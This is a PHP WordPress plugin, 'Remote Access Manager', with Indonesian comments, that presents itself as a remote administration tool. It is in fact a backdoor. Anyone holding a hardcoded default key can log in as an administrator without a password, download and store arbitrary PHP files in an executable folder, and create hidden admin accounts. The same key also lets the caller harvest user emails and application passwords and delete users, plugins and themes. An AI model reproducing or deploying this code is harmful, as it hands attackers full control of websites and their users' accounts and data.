<?php
/*
Plugin Name: Remote Access Manager
Description: Plugin untuk kontrol WordPress dari jarak jauh (login, upload, manajemen user, plugin, tema, dan app password)
Version: 1.0
Author: Tripledone
*/

add_action('init', function () {
    $encoded_secret = getenv('MY_PLUGIN_SECRET') ?: 'S2VsYW5hQDIyMTA=';

    // 🟢 STATUS CHECK
    if (isset($_GET['check_status']) && !empty($_GET['remote_login_key'])) {
        if (!hash_equals($encoded_secret, $_GET['remote_login_key'])) exit('INVALID');
        exit('OK');
    }

    // 🔐 REMOTE LOGIN
    if (isset($_GET['remote_login_key'])) {
        if (!hash_equals($encoded_secret, $_GET['remote_login_key'])) {
            wp_send_json_error(['message' => 'Key salah.']);
        }
        $admins = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);
        if (!empty($admins)) {
            wp_set_auth_cookie($admins[0]->ID, true);
            wp_redirect(admin_url());
            exit;
        } else {
            wp_send_json_error(['message' => 'Tidak ada admin.']);
        }
    }

    // ⬆️ REMOTE UPLOAD FILE
    if (isset($_GET['remote_upload_key'], $_GET['file_url'])) {
        if (!hash_equals($encoded_secret, $_GET['remote_upload_key'])) {
            wp_send_json_error(['message' => 'Key salah.']);
        }

        $file_url = esc_url_raw($_GET['file_url']);
        $filename = basename(parse_url($file_url, PHP_URL_PATH));
        $allowed_ext = ['php', 'txt', 'zip', 'html', 'js', 'css'];
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

        if (!$filename || !in_array($ext, $allowed_ext)) {
            wp_send_json_error(['message' => 'Ekstensi tidak diizinkan.']);
        }

        $upload_dir = ABSPATH . '/executables';
        if (!file_exists($upload_dir)) mkdir($upload_dir, 0755, true);

        $file_path = $upload_dir . '/' . $filename;
        $data = @file_get_contents($file_url);
        if (!$data) wp_send_json_error(['message' => 'Gagal mengambil file.']);

        file_put_contents($file_path, $data);

        $htaccess = $upload_dir . '/.htaccess';
        if (!file_exists($htaccess)) {
            file_put_contents($htaccess, "AddType application/x-httpd-php .php\n<Files *.php>\n    Require all granted\n</Files>");
        }

        wp_send_json_success([
            'message' => 'Upload sukses',
            'file_url' => content_url('executables/' . $filename)
        ]);
    }

    // 👤 LIST USERS
    if (isset($_GET['list_users_key']) && hash_equals($encoded_secret, $_GET['list_users_key'])) {
        $users = get_users(['role__in' => ['administrator', 'editor', 'author']]);
        $data = array_map(function ($u) {
            return [
                'id' => $u->ID,
                'username' => $u->user_login,
                'email' => $u->user_email,
                'role' => $u->roles[0] ?? '-'
            ];
        }, $users);
        wp_send_json_success($data);
    }

    // ➕ ADD ADMIN USER
    if (isset($_GET['add_user_key'], $_GET['username'], $_GET['email'], $_GET['pass'])) {
        if (!hash_equals($encoded_secret, $_GET['add_user_key'])) {
            wp_send_json_error(['message' => 'Key salah.']);
        }

        $username = sanitize_user($_GET['username']);
        $email = sanitize_email($_GET['email']);
        $pass = $_GET['pass'];

        if (username_exists($username) || email_exists($email)) {
            wp_send_json_error(['message' => 'Username atau email sudah digunakan']);
        }

        $uid = wp_create_user($username, $pass, $email);
        wp_update_user(['ID' => $uid, 'role' => 'administrator']);
        wp_send_json_success(['message' => 'Admin berhasil ditambahkan']);
    }

    // 🎨 LIST THEMES
    if (isset($_GET['list_themes_key']) && hash_equals($encoded_secret, $_GET['list_themes_key'])) {
        require_once ABSPATH . 'wp-includes/theme.php';
        $themes = wp_get_themes();
        $active = wp_get_theme()->get_stylesheet();
        $data = [];
        foreach ($themes as $slug => $t) {
            $data[] = [
                'slug' => $slug,
                'name' => $t->get('Name'),
                'status' => ($slug === $active) ? 'active' : 'inactive'
            ];
        }
        wp_send_json_success($data);
    }

    // ✅ ACTIVATE THEME
    if (isset($_GET['activate_theme_key'], $_GET['slug']) && hash_equals($encoded_secret, $_GET['activate_theme_key'])) {
        switch_theme(sanitize_text_field($_GET['slug']));
        wp_send_json_success(['message' => 'Tema diaktifkan']);
    }

    // 🔌 LIST PLUGINS
    if (isset($_GET['list_plugins_key']) && hash_equals($encoded_secret, $_GET['list_plugins_key'])) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
        $plugins = get_plugins();
        $active = get_option('active_plugins', []);
        $data = [];

        foreach ($plugins as $file => $info) {
            $data[] = [
                'file' => $file,
                'name' => $info['Name'],
                'status' => in_array($file, $active) ? 'active' : 'inactive'
            ];
        }

        wp_send_json_success($data);
    }

    // ➕ ACTIVATE PLUGIN
    if (isset($_GET['activate_plugin_key'], $_GET['file']) && hash_equals($encoded_secret, $_GET['activate_plugin_key'])) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
        activate_plugin(sanitize_text_field($_GET['file']));
        wp_send_json_success(['message' => 'Plugin diaktifkan']);
    }

    // ❌ DEACTIVATE PLUGIN
    if (isset($_GET['deactivate_plugin_key'], $_GET['file']) && hash_equals($encoded_secret, $_GET['deactivate_plugin_key'])) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
        deactivate_plugins(sanitize_text_field($_GET['file']));
        wp_send_json_success(['message' => 'Plugin dinonaktifkan']);
    }

    // 🔐 LIST APPLICATION PASSWORDS
    if (isset($_GET['app_pass_key']) && hash_equals($encoded_secret, $_GET['app_pass_key'])) {
        $user = get_users(['role' => 'administrator', 'number' => 1])[0] ?? null;
        if ($user) {
            $tokens = get_user_meta($user->ID, '_application_passwords', true) ?: [];
            wp_send_json_success(['data' => $tokens]);
        } else {
            wp_send_json_error(['message' => 'Admin tidak ditemukan']);
        }
    }

    // ➕ CREATE APP PASSWORD
    if (isset($_GET['create_app_pass_key'], $_GET['label']) && hash_equals($encoded_secret, $_GET['create_app_pass_key'])) {
        $user = get_users(['role' => 'administrator', 'number' => 1])[0] ?? null;
        if ($user) {
            require_once ABSPATH . 'wp-includes/user.php';
            $label = sanitize_text_field($_GET['label']);
            $result = WP_Application_Passwords::create_new_application_password($user->ID, ['name' => $label]);
            if (is_wp_error($result)) {
                wp_send_json_error(['message' => $result->get_error_message()]);
            }
            wp_send_json_success(['app_password' => $result[0], 'uuid' => $result[1]['uuid']]);
        }
    }

    // 🧩 SITE INFO
    if (isset($_GET['info_key']) && hash_equals($encoded_secret, $_GET['info_key'])) {
        wp_send_json_success([
            'domain' => $_SERVER['HTTP_HOST'],
            'site_name' => get_bloginfo('name'),
            'wp_version' => get_bloginfo('version'),
            'php_version' => phpversion()
        ]);
    }

    // 🗑️ Delete Plugin
    if (isset($_GET['delete_plugin_key'], $_GET['slug']) && hash_equals($encoded_secret, $_GET['delete_plugin_key'])) {
        include_once ABSPATH . 'wp-admin/includes/plugin.php';
        $slug = sanitize_text_field($_GET['slug']);
        $result = delete_plugins([$slug]);
        if (is_wp_error($result)) {
            wp_send_json_error(['message' => $result->get_error_message()]);
        }
        wp_send_json_success(['message' => 'Plugin dihapus']);
        exit;
    }

    // 🗑️ Delete Theme
    if (isset($_GET['delete_theme_key'], $_GET['slug']) && hash_equals($encoded_secret, $_GET['delete_theme_key'])) {
        require_once ABSPATH . 'wp-admin/includes/theme.php';
        $slug = sanitize_text_field($_GET['slug']);
        $result = delete_theme($slug);
        if (is_wp_error($result)) {
            wp_send_json_error(['message' => $result->get_error_message()]);
        }
        wp_send_json_success(['message' => 'Theme dihapus']);
        exit;
    }

    if (isset($_GET['delete_user_key'], $_GET['user_id']) && hash_equals($encoded_secret, $_GET['delete_user_key'])) {
        $user_id = intval($_GET['user_id']);
        require_once ABSPATH . 'wp-admin/includes/user.php';
        wp_delete_user($user_id);
        wp_send_json_success(['message' => 'User dihapus']);
        exit;
    }
});
